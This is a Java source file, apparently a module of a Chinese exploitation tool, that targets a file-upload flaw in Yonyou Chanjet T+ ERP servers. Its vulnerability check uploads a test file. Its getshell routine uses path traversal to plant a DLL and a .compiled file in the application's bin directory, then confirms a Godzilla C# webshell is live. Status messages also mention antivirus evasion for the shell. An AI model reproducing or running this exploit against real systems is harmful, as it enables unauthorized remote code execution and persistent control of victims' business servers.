package exp.oa.yongyou;

import core.Exploitlnterface;
import java.util.HashMap;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class yongyou_chajet_upload implements Exploitlnterface {
    private final HashMap<String,String> headers = new HashMap<>();

    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return this.att(url, shell.Testpath, textArea, "nishizhu.txt");
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return this.attshell(url,textArea);
    }

    private Boolean att(String url,String path,TextArea textArea,String filename){
        this.headers.put("Content-Type","multipart/form-data; boundary=cdc420c58f599a01de22d557d538b9a4");
        String fir_post = "--cdc420c58f599a01de22d557d538b9a4\r\n" +
                "Content-Disposition: form-data; name=\"File1\"; filename=\"" + filename + "\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                shell.readFile(path) + "\r\n" +
                "--cdc420c58f599a01de22d557d538b9a4--";

        Response post = HttpTools.post(url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1", fir_post ,this.headers, "utf-8");
        if(post.getCode() == 200){
            Response response = HttpTools.get(url + "/tplus/SM/SetupAccount/images/" + filename, new HashMap<String, String>(), "utf-8");
            if(response.getText().contains(shell.test_payload)){
                textArea.appendText("\n 漏洞存在，测试文件写入成功 \n地址为：" + url + "/tplus/SM/SetupAccount/images/" + filename);
                return true;
            }else {
                textArea.appendText("\n yongyou_chajet_upload - 漏洞不存在 (出现误报请联系作者)");
                return false;
            }
        }else {
            textArea.appendText("\n yongyou_chajet_upload - 漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }

    private Boolean attshell(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<String,String>();
        head.put("Content-Type","multipart/form-data; boundary=cdc420c58f599a01de22d557d538b9a4");

        byte[] fir_start_data = ("--cdc420c58f599a01de22d557d538b9a4\r\n" +
                "Content-Disposition: form-data; name=\"File1\"; filename=\"../../../bin/App_Web_nishizhu.aspx.cdcab7d2.dll\"\r\n" +
                "Content-Type: image/jpeg\r\n\r\n"
        ).getBytes();
        byte[] end_data = ("--cdc420c58f599a01de22d557d538b9a4--").getBytes();
        Response upload_1 = HttpTools.upload(url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1", head, fir_start_data, end_data, shell.chajetDllpath, "utf-8");
        if(upload_1.getCode() == 200){
            textArea.appendText("\r\n DLL写入成功  开始写入 compiled");

            byte[] sec_start_data = ("--cdc420c58f599a01de22d557d538b9a4\r\n" +
                    "Content-Disposition: form-data; name=\"File1\"; filename=\"../../../bin/nishizhu.aspx.cdcab7d2.compiled\"\r\n" +
                    "Content-Type: image/jpeg\r\n\r\n"
            ).getBytes();
            Response upload_2 = HttpTools.upload(url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1", head, sec_start_data, end_data, shell.chajetCompiledpath, "utf-8");
            if(upload_2.getCode() == 200){
                textArea.appendText("\n compiled写入成功 连接shell测试");

                Response response_3 = HttpTools.get(url + "/tplus/nishizhu.aspx?preload=1", new HashMap<String, String>(), "utf-8");
                if(response_3.getText().contains(shell.test_payload)){
                    textArea.appendText("\n Shell 获取成功 \n地址为：/tplus/nishizhu.aspx?preload=1  哥斯拉 Cshap / cshap_aes_base64");
                    return true;
                }else {
                    textArea.appendText("\n shell连接失败 请取消getshell进行漏洞检测 若txt文件写入成功 则需shell免杀");
                    return false;
                }
            }else {
                textArea.appendText("\n shell连接失败 请取消getshell进行漏洞检测 若txt文件写入成功 则需shell免杀");
                return false;
            }

        }else {
            textArea.appendText("\n shell连接失败 请取消getshell进行漏洞检测 若txt文件写入成功 则需shell免杀");
            return false;
        }
    }
}
